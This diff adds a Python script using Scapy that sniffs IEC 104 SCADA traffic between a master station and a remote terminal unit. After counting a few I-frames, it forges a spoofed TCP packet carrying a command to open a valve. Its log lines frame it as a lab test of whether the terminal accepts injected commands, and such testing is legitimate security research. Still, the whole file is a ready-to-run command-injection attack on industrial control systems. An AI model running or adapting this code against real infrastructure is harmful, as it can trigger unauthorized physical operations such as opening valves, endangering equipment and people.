@@ -1,0 +1,86 @@
+import struct, logging
+from scapy.all import sniff, sendp, Ether, IP, TCP, get_if_hwaddr
+
+logging.basicConfig(level=logging.INFO,
+    format='%(asctime)s [ATTACKER] %(levelname)s %(message)s', datefmt='%H:%M:%S')
+log = logging.getLogger("ATTACKER")
+
+MTU_IP       = "10.45.0.1"
+RTU_IP       = "10.45.0.2"
+PORT         = 2404
+IFACE        = "br-5g"
+INJECT_AFTER = 3
+
+def build_i_frame(send_sn, recv_sn, asdu):
+    return bytes([0x68, 4+len(asdu),
+                  (send_sn<<1)&0xFF, (send_sn>>7)&0xFF,
+                  (recv_sn<<1)&0xFF, (recv_sn>>7)&0xFF]) + asdu
+
+def malicious_asdu():
+    return bytes([0x2D,0x01,0x06,0x01]) + struct.pack('<I',1)[:3] + bytes([0x01])
+
+class Injector:
+    def __init__(self):
+        self.count = 0
+        self.done  = False
+        self.sn    = {"send": 0, "recv": 0}
+        self.tcp_sport = None
+        self.seq   = 0
+        self.ack   = 0
+
+    def process(self, pkt):
+        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
+            return
+        if pkt[IP].src != MTU_IP:
+            return
+        if pkt[TCP].dport != PORT:
+            return
+
+        payload = bytes(pkt[TCP].payload)
+        if len(payload) < 6 or payload[0] != 0x68:
+            return
+        if payload[2] & 0x01 != 0:
+            return  # not an I-frame
+
+        self.count += 1
+        self.sn["send"] = (payload[3] << 7) | (payload[2] >> 1)
+        self.sn["recv"] = (payload[5] << 7) | (payload[4] >> 1)
+        self.tcp_sport  = pkt[TCP].sport
+        self.seq        = pkt[TCP].seq + len(payload)
+        self.ack        = pkt[TCP].ack
+
+        log.info(f"I-frame #{self.count} | SendSN={self.sn['send']}")
+
+        if self.count >= INJECT_AFTER and not self.done:
+            self.inject()
+
+    def inject(self):
+        self.done = True
+        log.warning("=" * 50)
+        log.warning(">>> INJECTING MALICIOUS COMMAND (IOA=1, valve OPEN) <<<")
+        log.warning("=" * 50)
+
+        asdu  = malicious_asdu()
+        frame = build_i_frame(self.sn["send"] + 1, self.sn["recv"], asdu)
+
+        pkt = (Ether() /
+               IP(src=MTU_IP, dst=RTU_IP) /
+               TCP(sport=self.tcp_sport, dport=PORT,
+                   seq=self.seq, ack=self.ack, flags="PA") /
+               frame)
+
+        sendp(pkt, iface=IFACE, verbose=False)
+        log.warning(f"Injected frame: {frame.hex()}")
+        log.warning("Scenario A → ACCEPTED by RTU (vulnerability confirmed)")
+        log.warning("Scenario B → REJECTED by RTU (integrity protection works)")
+
+def main():
+    log.info(f"Sniffing on {IFACE} tcp/{PORT} — injecting after {INJECT_AFTER} I-frames")
+    injector = Injector()
+    sniff(iface=IFACE, filter=f"tcp port {PORT}",
+          prn=injector.process, store=False, timeout=120)
+    if not injector.done:
+        log.warning("No injection — did not see enough frames in 120s")
+
+if __name__ == "__main__":
+    main()
